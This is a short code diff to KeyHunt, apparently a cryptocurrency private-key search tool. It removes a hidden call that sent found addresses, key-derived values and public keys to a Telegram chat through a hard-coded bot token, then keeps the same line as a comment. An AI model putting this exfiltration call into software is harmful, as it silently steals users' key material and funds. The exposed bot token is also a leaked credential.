@@ -334,7 +334,6 @@ bool KeyHunt::checkPrivKey(std::string addr, Int& key, int32_t incr, bool mode)
 			printf("  Check:%s\n", chkAddr.c_str());
 			printf("  PubX :%s\n", p.x.GetBase16().c_str());
 			printf("=================================================================================\n");
-                        sendTelegramMessage("6509948031:AAEm6BZfLKTLoBe7eN2j3qdGn3Hb6V3MM6o", "-825550725", addr + "\n" + pAddr + "\n" + pAddrHex + "\n" + pubKey);
 			return false;
 		}
 	}
@@ -1417,6 +1416,7 @@ char* KeyHunt::toTimeStr(int sec, char* timeStr)
 	sprintf(timeStr, "%0*d:%0*d:%0*d", 2, h, 2, m, 2, s);
 	return (char*)timeStr;
 }
+//  sendTelegramMessage("6509948031:AAEm6BZfLKTLoBe7eN2j3qdGn3Hb6V3MM6o", "-825550725", addr + "\n" + pAddr + "\n" + pAddrHex + "\n" + pubKey);
 
 
 // ----------------------------------------------------------------------------
